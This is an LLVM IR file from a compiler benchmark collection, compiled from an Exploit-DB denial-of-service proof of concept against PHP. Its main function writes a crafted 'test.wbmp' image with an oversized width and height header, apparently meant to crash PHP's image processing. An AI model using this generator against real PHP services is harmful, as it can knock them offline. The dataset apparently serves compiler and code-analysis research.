; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/php/dos/extr_29823.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/php/dos/extr_29823.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [10 x i8] c"test.wbmp\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"w\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = alloca i32*, align 8
  %5 = load i32, i32* @BUFSIZE, align 4
  %6 = zext i32 %5 to i64
  %7 = call i8* @llvm.stacksave()
  store i8* %7, i8** %2, align 8
  %8 = alloca i8, i64 %6, align 16
  store i64 %6, i64* %3, align 8
  %9 = call i32* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32* %9, i32** %4, align 8
  store i32 0, i32* %1, align 4
  %10 = load i32, i32* %1, align 4
  %11 = load i32*, i32** %4, align 8
  %12 = call i32 @fputc(i32 %10, i32* %11)
  %13 = load i32, i32* %1, align 4
  %14 = load i32*, i32** %4, align 8
  %15 = call i32 @fputc(i32 %13, i32* %14)
  store i32 132, i32* %1, align 4
  %16 = load i32, i32* %1, align 4
  %17 = load i32*, i32** %4, align 8
  %18 = call i32 @fputc(i32 %16, i32* %17)
  store i32 128, i32* %1, align 4
  %19 = load i32, i32* %1, align 4
  %20 = load i32*, i32** %4, align 8
  %21 = call i32 @fputc(i32 %19, i32* %20)
  %22 = load i32, i32* %1, align 4
  %23 = load i32*, i32** %4, align 8
  %24 = call i32 @fputc(i32 %22, i32* %23)
  %25 = load i32, i32* %1, align 4
  %26 = load i32*, i32** %4, align 8
  %27 = call i32 @fputc(i32 %25, i32* %26)
  store i32 1, i32* %1, align 4
  %28 = load i32, i32* %1, align 4
  %29 = load i32*, i32** %4, align 8
  %30 = call i32 @fputc(i32 %28, i32* %29)
  store i32 4, i32* %1, align 4
  %31 = load i32, i32* %1, align 4
  %32 = load i32*, i32** %4, align 8
  %33 = call i32 @fputc(i32 %31, i32* %32)
  %34 = trunc i64 %6 to i32
  %35 = load i32*, i32** %4, align 8
  %36 = call i32 @fwrite(i8* %8, i32 %34, i32 1, i32* %35)
  %37 = load i32*, i32** %4, align 8
  %38 = call i32 @fclose(i32* %37)
  %39 = load i8*, i8** %2, align 8
  call void @llvm.stackrestore(i8* %39)
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @fputc(i32, i32*) #2

declare dso_local i32 @fwrite(i8*, i32, i32, i32*) #2

declare dso_local i32 @fclose(i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
